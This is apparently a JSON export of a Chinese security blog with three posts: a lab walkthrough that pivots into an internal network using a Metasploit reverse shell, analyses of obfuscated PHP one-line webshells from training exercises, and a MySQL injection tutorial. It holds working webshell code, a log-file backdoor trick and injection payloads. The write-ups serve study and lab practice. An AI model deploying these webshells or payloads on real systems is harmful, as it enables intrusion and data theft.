{"meta":{"title":"13l00m'World","subtitle":"","description":"","author":"13l00m","url":"http://yoursite.com","root":"/"},"pages":[{"title":"My Blog Name | 404","date":"2020-03-08T15:04:18.108Z","updated":"2020-03-08T15:04:18.108Z","comments":true,"path":"404.html","permalink":"http://yoursite.com/404.html","excerpt":"","text":""},{"title":"My Blog Name | 404","date":"2020-03-08T15:06:44.082Z","updated":"2020-03-08T15:04:18.108Z","comments":true,"path":"404.html","permalink":"http://yoursite.com/404.html","excerpt":"","text":""},{"title":"","date":"2020-03-08T15:00:31.575Z","updated":"2020-03-08T15:00:31.575Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-03-08T15:00:42.601Z","updated":"2020-03-08T15:00:42.601Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"【靶机】记一次简单的内网渗透测试","slug":"【靶机】记一次简单的内网渗透测试","date":"2020-03-07T12:53:02.000Z","updated":"2020-03-07T13:23:53.102Z","comments":true,"path":"2020/03/07/【靶机】记一次简单的内网渗透测试/","link":"","permalink":"http://yoursite.com/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"开始之前先说一下实验环境： 两台物理机（物理机里面存有虚拟机） win10 存在kali 虚拟机 ip都在192.168.1.* 网段 2k3 存在2k3 虚拟机 物理机在192.168.1.* 网段 虚拟机在192.168.159.*网段（提供内网环境） 两台物理机可互相ping通，kali虚拟机也可以ping通2k3物理机，2k3虚拟机只能由2k3物理机ping通（这么说可以理解吧） 漏洞环境就简单处理了，主要是想记录一下如何利用2k3外网服务器做跳板间接连通内网服务器继续进行测试 2k3物理机ip：192.168.1.2 2k3虚拟机ip：192.168.159.139 win10物理机ip：192.168.1.3 kali虚拟机ip：192.168.1.123 开始实验： 访问 192.168.1.2 file 进行目录扫描： file 每个目录访问一遍 file 这靶场大家应该都玩过了，上传个小马（就当上传漏洞了），目录里面还有一个phpmyadmin 这个一会儿进行作跳板的时候会用到。避免重复呢，我就直接上传个小马 file file 利用msf生成木马（用msf回弹主要是需要添加路由） file 在msf模块监听设置好的端口 file file 用之前传的小马+蚁剑虚拟终端打开上传的shell123.exe msf 可以检测到回传 file 利用内置模块检测可以连通的内网网段 file 已知内网机器是在192.168.159.0/24段的，我就不卖关子直接添加路由了（route add 也是可以的） file 查看添加路由情况 file 接下来利用msf 进行内网网段中存活主机的扫描 file 已知内网ip在139 我就缩小一下范围，节约时间 file 成功检测到139开放80端口 但这个时候直接访问是不可行的，接下来进行端口映射 回到刚才的Session file 利用 portfwd 进行端口映射将内网中的80端口映射到kali机中的80端口访问http://localhost file 访问成功为了方便拿shell，这里就用phpmyadmin弱口令直接进去了 根据phpinfo文件提供的绝对路径，修改sql的日志存储绝对路径就可以构造后门php文件 file show variables like &apos;%general%&apos;; #查看配置set global general\\_log = on; #开启general log 模式set global general_log_file = &apos;D:\\phpstudy\\PHPTutorial\\WWW&apos;; #设置日志目录为shell地址select &quot;payload&quot; 写入shell 这里可能是我的配置问题，小马回传到msf的时候会收到但是直接断掉，所以直接上传了个大马 file 上传dama.exe可以正常收到回弹信息 本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://yoursite.com/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"MSF","slug":"MSF","permalink":"http://yoursite.com/tags/MSF/"}]},{"title":"PHP恶意代码分析","slug":"PHP恶意代码分析","date":"2019-11-28T01:58:50.000Z","updated":"2019-11-28T04:15:08.280Z","comments":true,"path":"2019/11/28/PHP恶意代码分析/","link":"","permalink":"http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"墨者学院–WebShell代码分析溯源(第11题) &lt;?php if(!empty($_GET[1]) &amp;&amp; $_GET[1]=='GET.fPZ87') &#123; $_=@fopen('t.php', 'a'); @fwrite($_,\"&lt;?php \\$_=str_replace('ilo','ass',str_replace('vey','ert',\\$_GET[2]));@\\$_(\\$_POST[1]);?&gt;\"); @fclose($_);&#125;?&gt; 程序分析 if(!empty($_GET[1]) &amp;&amp; $_GET[1]=='GET.fPZ87') //判断通过GET方式参数1是否为空 且 参数值是否为 GET.fPZ87 $_= @fopen('t.php','a');// 打开一个新文件 t.php ,模式 a 为写入内容不覆盖//分析构造的一句话&lt;?php \\$_=str_replace('ilo','ass',str_replace('vey','ert',\\$_GET[2])); @\\$_(\\$_POST[1]); ?&gt; 变量 $_ 由 $_GET[2] 通过GET方式传入数据，再由嵌套替换决定最后的内容 \\$_ 与 \\$_GET[2] 前面的 \\ 是转义用的 str_replace(待匹配字符,待替换字符,待匹配字符串) 所以呢，最后拼接的一句话为： assert($_POST[1]) //当然 要完成这种拼接，$_GET[2]需要传入的值为：ilovey $_POST[1]需要传入的值为：需要执行的php代码 实战 墨者学院–WebShell代码分析溯源(第10题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];declare(ticks=1);register_tick_function ($e, $_REQUEST['GET']);?&gt; 程序分析 php declare (ticks = N)关于什么是低级语句&lt;?phperror_reporting(0); //尽管程序出错也不会报错$e = $_REQUEST['e']; // 接收参数declare(ticks=1); //php官方文档对ticks的定义 ：//A tick is an event that occurs for every N low-level tickable statements executed by the parser within the declare block. The value for N is specified using ticks=N within the declare block's directive section.||Tick（时钟周期）是一个在 declare 代码段中解释器每执行 N 条可计时的低级语句就会发生的事件。N 的值是在 declare 中的 directive 部分用ticks=N 来指定的. 我个人理解的大意就是说, tick 这个周期上会绑定一个事件, 这个事件, 当Zend引擎执行到所设置的 tick (就是N) 行低级语句时, 就执行 register_tick_function() 定义的事件 因为这里只涉及到如何利用register_tick_function()函数进行构造代码执行，暂不深究 register_tick_function ($e, $_REQUEST['GET']);register_tick_function(函数名,给函数传入的值)如果要构造远程代码执行的话：register_tick_function('assert','command')?&gt; 实战 墨者学院–WebShell代码分析溯源(第9题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];register_shutdown_function($e, $_REQUEST['REQUEST']);?&gt; 程序分析 register_shutdown_function()&lt;?phperror_reporting(0); //不报错$e = $_REQUEST['e'];// $_REQUEST[] POST、GET都可传入参数register_shutdown_function($e, $_REQUEST['REQUEST']);前面已经po出了register_shutdown_function()函数的应用环境，在这里就简单说一下register_shutdown_function(待执行的函数名,向函数里面传入的值)//这里依然用 assert 进行构造代码执行当PHP程序执行完成后，自动执行register_shutdown_function函数，该函数需要一个参数，用来指定由谁处理这些后续的工作。其中，程序执行完成，分为以下几种情况: 第一种：php代码执行过程中发生错误 第二种：php代码顺利执行成功 第三种：php代码运行超时 第四种：页面被用户强制停止?&gt; 实战 墨者学院–WebShell代码分析溯源(第8题) &lt;?php$e = $_REQUEST['e'];$arr = array($_POST['pass'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; 程序分析 array_walk() preg_replace()&lt;?php$e = $_REQUEST['e'];$arr = array($_POST['pass'] =&gt; '|.*|e',);上面定义数组的意思是,通过$_POST['pass']传入数组元素的键名,'|.*|e'为该键键值php定义数组也可以直接输入键值 -&gt; $arr = array(键值1,键值2,键值3);如果php数组里面上述两种情况都出现''' &lt;?php function test($a,$b)&#123; echo \"$a,$b&lt;/br&gt;\"; &#125; $a = array(1,\"qian\"=&gt;\"hou\",2,3,4); 1,2,3,4相对应的键名不会因为第二个元素的出现发生改变 查看如何输出可以将代码执行 array_walk($a,'test'); ?&gt;'''array_walk($arr, $e, '');array_walk(array,function,userdata...) array_walk(数组名（一个元素的键名与键值当作右侧函数的第二、第一个参数）,定义的函数名,传入的第三个参数) 利用array_wlak传参的功能，借助 preg_replace() 可导致代码执行preg_replace()： preg_replace 函数执行一个正则表达式的搜索和替换当开启 /e 模式时，通过正则表达式匹配到的数据会先通过php代 码的方式执行 preg_replace ($pattern(正则表达式及相应的模式),$replacement(待匹配数据),$subject(待替换数据))整体流程分析 $e = $_REQUEST['e']; 通过REQUEST['e'] 传入 preg_replace() 函数 $arr = array($_POST['pass'] =&gt; '|.*|e',); 通过 POST 传入 将要执行的php代码,将该函数与正则表达 式'|.*|e' array_walk($arr, $e, ''); -&gt; array($arr,preg_replace(),'') // 第三个参数是将匹配到的字符替换为 '' 一定要记住第一个参数(数组)传入的键名与键值分别当作传入函数的第二参数与第一参数, preg_replace 的第二参数才 可以导致代码执行，第一参数用来匹配字符。 如果传入的代码匹配不完整会导致命令无法执行?&gt; 墨者学院–WebShell代码分析溯源(第7题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];$arr = array('test', $_REQUEST['POST']);uasort($arr, base64_decode($e));?&gt; 程序分析 uasort(Array,MyFunction)利用python进行base64加密&lt;?phperror_reporting(0);$e = $_REQUEST['e']; // 传入可执行代码的函数，需要base64编码$arr = array('test', $_REQUEST['POST']);//向数组中添加一个元素（待执行php命令）uasort($arr, base64_decode($e));uasort(传入的数组,编码后的执行函数) uasort 将数组传入函数中(参数2)进行重新整合（整合情况根据函数内容决定），在整合过程中会造成php代码执行 base64编码可利用python内置base64模块进行编码 base64.b64encode('待编码字符串'.encode('urf8')) 综上 传入与构造的语句应为： e = base64.b64encode('assert'.encode()) -&gt;YXNzZXJ0 (e = YXNzZXJ0) $_REQUEST['POST'] = phpinfo() //证明可执行代码即可 $arr = ('test','phpinfo()') uasort($arr,'assert') -&gt; 将'test','phpinfo()' 分别传入assert，遇到phpinfo() 进行代码执行?&gt; 墨者学院–WebShell代码分析溯源(第6题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];$arr = array($_POST['POST'],);array_map(base64_decode($e), $arr);?&gt; 程序分析 array_map(MyFunction,Array)&lt;?php error_reporting(0);$e = $_REQUEST['e'];$arr = array($_POST['POST'],);//前面都是些老生常谈的东西，在这里就不细说了array_map(base64_decode($e), $arr);array_map(Function,Array) Function 里面有对数组元素内容自定义的操作，传入函数时元素值若为php可执行代码，则会导致代码执行如何用python将字符串加密上面说过了 接下来构造传参导致代码执行 e = YXNzZXJ0('assert' base64编码后的内容) POST(POST方式) = phpinfo() //可证明代码执行即可?&gt; 墨者学院–WebShell代码分析溯源(第5题) &lt;?phperror_reporting(0);call_user_func('assert', $_REQUEST['assert']);?&gt; 程序分析 call_user_func(MyFunction,待传入参数)&lt;?phperror_reporting(0);call_user_func('assert', $_REQUEST['assert']);call_user_func(MyFunction,待传入的参数) ''' &lt;?php function test($a)&#123; echo $a; &#125; @call_user_func('test',$_POST[cmd]); //test为自定义参数,通过POST传入的参数即运行结果 ?&gt;'''既然能够调用任意函数，当然也能调用可执行代码的危险函数 assert 因为代码中已经存在 assert 所以在这里直接传入待执行的命令就好 assert = phpinfo() 这里通过REQUEST传入，POST、GET都可以?&gt; 墨者学院–WebShell代码分析溯源(第4题) &lt;?phperror_reporting(0);$e=$_REQUEST['e'];$arr=array($_POST['POST'],);array_filter($arr,base64_decode($e));?&gt; 程序分析 array_filter(Array,MyFunction) &lt;?phperror_reporting(0);$e=$_REQUEST['e'];$arr=array($_POST['POST'],);array_filter($arr,base64_decode($e));array_filter 的作用是将数组内元素传入待定的函数中，若函数返回值为True则数组元素保留，返回False则不保留 ''' &lt;?php function test_odd($var) &#123; return $var&gt;2; // $var的值如果&lt;2 返回False &#125; $a1=array(\"a\",\"b\",2,3,4); print_r(array_filter($a1,\"test_odd\")); ?&gt; '''//程序运行结果会很直观的解释 array_filter 的作用 有传参的过程，函数名可控，参数可控 则可构造代码执行语句 e 依旧传入assert的base64编码 YXNzZXJ0 POST 传值为 phpinfo()?&gt; 墨者学院–WebShell代码分析溯源(第3题) &lt;?phperror_reporting(0);$g = array('','s');$gg = a.$g[1].ser.chr('116');@$gg($_POST[get]);?&gt; 程序分析 &lt;?phperror_reporting(0);$g = array('','s');$gg = a.$g[1].ser.chr('116'); //chr 为ASCII的解码 116对应的解码内容为：t //所以$gg = assert@$gg($_POST[get]); // 这里直接传想执行的代码即可?&gt; 墨者学院–WebShell代码分析溯源(第2题) &lt;?php $POST['POST']='assert';$array[]=$POST;$array[0]['POST']($_POST['assert']);?&gt; 程序分析 &lt;?php $POST['POST']='assert'; //将键名：POST 键值：assert 的一个数组元素放入 $POST 数组内$array[]=$POST; // 将数组 $POST 放入 数组 $array 里面构造一个二维数组$array[0]['POST']($_POST['assert']); 这里的$array[0]['POST']即 'assert' 所以该一句话木马最终构造为: assert($_POST['assert']) 通过POST传入待执行的php命令?&gt; 墨者学院–WebShell代码分析溯源(第1题) &lt;?phperror_reporting(0);$_GET['POST']($_POST['GET']);?&gt; 程序分析 &lt;?phperror_reporting(0);$_GET['POST']($_POST['GET']); //利用POST、GET传值，直接构造可执行语句即可POST = assertGET = phpinfo()?&gt; PHP代码分析溯源(第4题)&lt;?phpeval(gzinflate(base64_decode(&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));?&gt; 程序分析 base64+gzinflate压缩编码（加密）文件&lt;?phpeval(gzinflate(base64_decode(&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));gzinflate(base64_decode()) 用来解密base64+压缩编码处理后的字符串如果想看到编码内容 可以将eval替换为echo（在本题中适用，正常情况下大多需要密码进行解密） echo 的编码内容为：echo `$_REQUEST[a]`;; ?&gt; php 中的 ` (反引号)内的字符串当作系统命令执行 echo 会将命令执行的结果输出（如果没有 echo 命令照样执行） ?&gt; PHP代码分析溯源(第3题) &lt;?phperror_reporting(0); function noother_says_correct($number) &#123; $one = ord('1'); 49 $nine = ord('9'); 57 for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388'; &#125;if(noother_says_correct($_POST['pass']))&#123; /** 此处省略 **/&#125; else&#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;?&gt; 程序分析 php字符串与数字比较的不同方法&lt;?phperror_reporting(0); function noother_says_correct($number) &#123; $one = ord('1'); 49 $nine = ord('9'); 57 for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388'; // 这里必须是双等号，三等号不支持上述HEX比较方法 &#125;if(noother_says_correct($_POST['pass']))&#123; /** 此处省略 **/&#125; else&#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;?&gt; 在这解释一下程序的运行逻辑： 自定函数 noother_says_correct() 判断传入的值是否等于54975581388 且每个位数上面的数字是否否和 for 循环里 面的判断条件（每位数&lt;1&amp;&amp;&gt;9）正常输入key是不可能符合条件的。但是呢 php在变量与数字比较过程中可以通过HEX进 行比较 即 54975581388 = 0xccccccccc 这样就会符合条件 可以拿到flag PHP代码分析溯源(第2题) &lt;?phperror_reporting(0);$a1 = md5('QNKCDZO');$a = @$_POST['pass'];$a2 = @md5($a);if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $a1 == $a2) &#123; echo \"flag\"; exit(); &#125; else &#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;&#125;?&gt; 程序分析 MD5加密绕过&lt;?phperror_reporting(0);$a1 = md5('QNKCDZO'); //$a1 = 0e830400451993494058024219903391$a = @$_POST['pass'];$a2 = @md5($a); //$a2 = 通过pass传入数据通过MD5加密后的值if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $a1 == $a2) &#123; echo \"flag\"; //双等号在进行比较时传入的数据(0e……)会作为科学计数法进行运算-&gt;0 exit(); //所以传入一个前面也为0e的md5数据即可得到flag &#125; else &#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;&#125;?&gt;总结0e开头的md5未加密数据： QNKCDZO 240610708 aabg7XSs s878926199a aabC9RqS PHP代码分析溯源(第1题)php变种一句话&lt;?php @$_++; $__=(\"`\"^\"?\").(\":\"^\"&#125;\").(\"%\"^\"`\").(\"&#123;\"^\"/\"); $___=(\"$\"^\"&#123;\").(\"~\"^\".\").(\"/\"^\"`\").(\"-\"^\"~\").(\"(\"^\"|\"); $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);?&gt; 程序分析 &lt;?php @$_++; //未传入数据的变量初始化为0 $_++ -&gt; 1 $__=(\"`\"^\"?\").(\":\"^\"&#125;\").(\"%\"^\"`\").(\"&#123;\"^\"/\"); $___=(\"$\"^\"&#123;\").(\"~\"^\".\").(\"/\"^\"`\").(\"-\"^\"~\").(\"(\"^\"|\");'''$__、$___ 通过异或运算最终的结果分别为：_GET、_POST最后构造的一句话为：$&#123;_GET&#125;[!1]($&#123;_POST&#125;[1])传参进行命令执行 0(!1=0)=assert(GET)、1=whoami(POST)''' $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);?&gt;","categories":[{"name":"php代码审计","slug":"php代码审计","permalink":"http://yoursite.com/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"},{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"mysql注入漏洞方法及原理整理","slug":"mysql注入漏洞方法及原理整理","date":"2019-11-28T01:37:38.000Z","updated":"2019-11-29T07:19:29.876Z","comments":true,"path":"2019/11/28/mysql注入漏洞方法及原理整理/","link":"","permalink":"http://yoursite.com/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/","excerpt":"","text":"数据库注入漏洞类型整理写在开始 由于不同注入方法确定注入点后的获取相应数据方法相同，这里就统一写在一个地方 文章内容出现过的函数解释为自己所理解的，并不是最全的函数解释 最开始的是最详细的也是最基础的，避免重复,后面的只有原理代码和修复方案 下面说的所有注入他们的注入方法都不是固定的，要根据实际情况进行注入 sql注入基础确定注入点在进行黑盒测试的过程中，常用于确定注入点的方法 and 1=2–+# //对应的后端代码$id = $_GET['id'];$sql = \"select * from users where id =$id\"; http://localhost/?id=1 属于正常查询 返回正常页面 http://localhost/?iid=1 and 1=1 返回正常页面 http://localhost/?id=1 and 1=2 返回错误页面 对应后端处理代码生成sql语句:select * from admin where id=1;查询失败的sql语句:select * from admin where id =1 and 1=2; 原理解释 当在sql语句后面添加 and 1=2 / and 1=1 的时候 其中的 1=1 相当于 True 1=2 相当于 False and 相当于 且所以 当 and 前面的查询语句成立时 and 1=1 可返回正常内容 and 1=2 则返错误内容 ​ ‘ //对应的后端代码$id = $_GET['id'];$sql = \"select * from users where id='$id'\"; http://localhost/?id=1 属于正常查询 返回正常页面 http://localhost/?iid=1&#39; –+返回正常页面 http://localhost/?id=1&#39; 返回错误页面 对应后端处理代码生成sql语句:select * from admin where id = &apos;1&apos;查询失败的sql语句:select * from admin where id =&apos;1&apos;&apos; 原理解释 当多输入一个单引号(&apos;) 时，最后一个单引号未闭合导致报错为了进一步判断网站是否存在注入漏洞，通常再单引号后面加注释符(&apos;--+)来注释掉未闭合的单引号如果返回正常页面，则可以确定注入点 【解释】为什么加 and 1=1 或 and 1=2 都返回正常界面sql语言中，字符型与非字符型比较：如果字符串开始存在整形数据（2admin）则拿出来比较的字符串为2如果不存在整形数据，默认为0例子:select 1=&apos;1admin&apos;; 返回1select 1=&apos;admin&apos;; 返回0 “ //对应的后端代码$id = $_GET['id'];$sql = 'select * from users where id=\"$id\"'; 原理和上述相同，不复述 ‘) //对应的后端代码$id = $_GET['id'];$sql = \"select * from admin where id =('$id')\"; 原理和上述相同，不复述 “) //对应的后端代码$id = $_GET['id'];$sql = 'select * from admin where id =(\"$id\")'; 原理和上述相同，不复述 【经验】确定存在注入的情况下，快速判断为上述哪种类型在参数后面加 \\ 如果存在报错，大多可以爆出该参数的接收类型 上面说了最基础的确定注入点的方法，下面说一下如何利用漏洞获取数据库里面的信息 漏洞利用获取数据库信息1、获取字段信息 在参数后面加 order by +一个数字 eg: http://localhost/?id=1 order by 4 这里利用 order by 判断字段数量的原理 order by 在sql语句中用于指定字段列数排序，当输入的字段数大于实际最大字段数时，会产生报错。 所以利用 order by 可以判断某个数据表中的最大字段数 报错信息如下： Unknown column &apos;11&apos; in &apos;order clause&apos;2、获取字段相应出现的位置 在第一步中已经获得了一个最大字段数，接下来利用 union select 1,2,3,4……,最大字段数 来判断每个字段相对位置 利用 union select 获取相应信息的原理: union select 在sql语句中的作用是进行联合查询 例子： 两个数据表，每个数据表有相应的条件在进行数据输出 的过程中可用union select进行两个表的拼接 mysql&gt; select * from admin where id=1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin |+------+----------+----------+mysql&gt; select * from testt where id=1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | testt | testt |+------+----------+----------+mysql&gt; select * from admin where id=1 union select * from testt;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin || 1 | testt | testt |+------+----------+----------+ 因为两个数据表的字段最大值相同，所以会正常输出，如果不同则会报错(如下) The used SELECT statements have a different number of columns union select 不仅仅能拼接字段相同的表，还可以拼接字段相同的任意数据 mysql&gt; select * from admin where id=1 union select 1,2,3;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin || 1 | 2 | 3 |+------+----------+----------+ 当把sql语句输入到网站参数后面：http://localhost/?id=1 union select 1,2,3时 该网站后端程序仍返回正常数据 原因：就像上述表的查询相同，前后两个查询条件都为True，id=1的条件成立，所以网站返回正常内容，当构造的 id！=True时，数据表返回的内容只有 union select 之后的数据mysql&gt; select * from admin where id=-1 union select 1,2,3;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | 2 | 3 |+------+----------+----------+ 当网页参数构造的id为False（-1） 则返回的内容为union select 进行拼接的内容 如：http://localhost/?id=-1 union select 1,2,3 返回值为 2 说明 username 这个字段在第二个位置，且 可以利用这个字段获取数据库里面的所有信息 3、获取当前的数据库名、数据库版本信息、数据库当前用户等 利用第二步拼接语句 union select 获取db名 http://localhost/?id=-1 union select 1,database(),3 获取db版本信息 http://localhost/?id=-1 union select 1,version(),3 获取db当前用户 http://localhost/?id=-1 union select 1,user(),3 database(),version(),user() 都是数据库里面的内置函数，想进一步了解去百度 这里解释一下，为什么这些函数不放在1和3这两个位置： 因为第二步中的 union select 1,2,3 网页回显的信息只有2字段的数据信息，所以在进行获取数据的过程中，只 能利用2这个位置，实战中选择一个可以回显的数据字段即可，没有固定要求 4、获取所有数据库名（限制mysql版本&gt;=5.0） sql语句： select group_concat(schema_name) from information_schema.schemata; 解释为什么用 group_concat(): 正常情况下查询出来的数据不止有一行，所以需要group_concat把多行数据拼接到一行里面 limit 可以替换 group_concat() sql语言中的limit可以控制输出 limit 参数1,参数2 参数2 表示输出几行数据 参数1 表示输出第几块数据（块分多少由参数2控制） 所以相应的sql语句可以写为： select schema_name from information_schema.schemata limit 0,1 from 的作用 from的作用也就是他的直译来自(哪个数据库) from information_schema 就是选择 information_schema 这个数据库 . 的作用 information_schema.schemata中的 . 就是 information_schema 下的一个表 information_schema 与 schemata 可理解为父子关系 一定要注意 information_schema 只有mysql版本&gt;=5.0才有，若小于这个版本，只能利用最基本的方法获取数据5、获取当前数据库所有表名 sql语句: select group_concat(table_name) from information_schema.tables where table_schema=&apos;数据库名&apos;; where的作用是查询的条件，table_schema 为该表其中一个字段名不必深究为什么写这个（背背背） 其他的跟第四步重复，不再复述6、获取表的字段名 sql语句: select group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos;;7、获取字段信息 sql语句： select group_concat(字段1，字段2，字段3) from 数据库名.表名 这就是一套比较基础 完整的sql注入漏洞利用方法及过程 常见的sql注入漏洞类型报错注入updatexml()函数报错注入UPDATEXML(XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 报错原理：Xpath格式语法书写错误的话，就会报错 更好的理解updatexml updatexml的第二个参数相当于正常sql语句中的from where，都可以从大量数据中提取出特定想要的数据，我猜测这就是可以能够执行sql语句的原因（为什么能够执行sql语句我也不清楚，可能需要查看底层源码才能知晓）如何获取数据库里面的信息呢 select updatexml(1,concat(0x7e,database()),1) concat() 用于拼接输出结果 select concat(1,2) -&gt; 输出结果为：12 这里为了在实战中方便找到返回的数据用了 concat()。真实情况写不写都可以返回数据，不是一成不变的 死格式 0x7e为 ~ 的十六进制 sql语言在查询过程中可用想查询字符串的十六进制带替字符串，避免单、双引号混乱造成程序问题上面已经获取到库名，该如何获取其他数据上面已经说的很详细了，这里不复述 extractvalue()函数报错注入Extractvalue(xml_frag,xpath_expr)xml_frag: 目标xml文档xpath_expr: 利用Xpath路径法表示的查找路径报错原理：Xpath格式语法书写错误的话，就会报错因为extractvalue()与updatexml()都是对xml文件进行操作，通过报错获取数据的原理相似，这里不再复述简单说一下如何构造sql语句进行获取数据库信息select extractvalue(1,concat(0x7e,database())); floor()函数报错注入Mysql报错注入原理分析(count()、rand()、group by) 获取数据库: select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a 语句中的floor(rand(0)*2)是什么意思？是为了产生一个不唯一的且能会出现重复的数字。rand()函数产生的数会随机 产生0到1的小数，而加上参数变成rand(0)的时候，会产生一个确定的小数（我的理解） 所以，rand(0)是为了得到一个确定的数，也就是执行第几次就是什么数据（我自己的理解），而*2再floor是为了得 到唯一的整数数据,将floor得到的数据范围限定在[0,1]之间 再说报错，报了什么错呢，是主键重复，为什么会主键重复呢?这就group by 和 count(*)有关了，我们先看count(*) 和group by组合一起的效果 结果会显示每个列的次数，而这个列的内容，是唯一的主键。而在查询过程中，是先建立一张虚拟表，一行一行插入的， 而插入时已经有重复主键了，那么，就会报错。当然，可能会问了，重复时，count(*)就加1了，为什么会主键重复呢？ 这就和rand()函数有关了，官方文档中提到，rand()函数在进行GROUP BY查询时会被计算多次，这里列举参考文档的解 释,我觉得说的很清楚： 1.查询前默认会建立空虚拟表 2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则 floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕 3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以 floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕 4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝 试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个 主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语 句才会报错的原因。获取表名: select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a获取表内容： select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a 待补充（有点难懂） 常用的为前三种，下面的稍微点一下 当mysql版本大于5.5.53时，下面出现的函数无法继续利用其进行报错注入 geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); multipoint()select * from admin where id=1 and multipoint((select * from(select * from(select user())a)b)); polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); exp()select * from test where id=1 and exp(~(select * from(select user())a)); NAME_CONST()函数报错注入（mysql版本&lt;5.1）在mysql中，列名重复会报错，所以name_const()函数就是利用这一特性，重新定义一个重复的列名来让数据库报错。定义重复列名报错语句：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 延时注入什么是延时注入在讲什么是延时注入之前呢，要先说一下为什么要用延时注入 之前存在sql注入漏洞的网站呢，你随便加个单引或双引就会报错，闭合方式也很好找。经过这几年痛苦的sql注入的磨 练，他们变机灵了……能够报错的网站程序越来越少，甚至有些存在注入点的网站不管加单引或双引他都会给你返回一个正 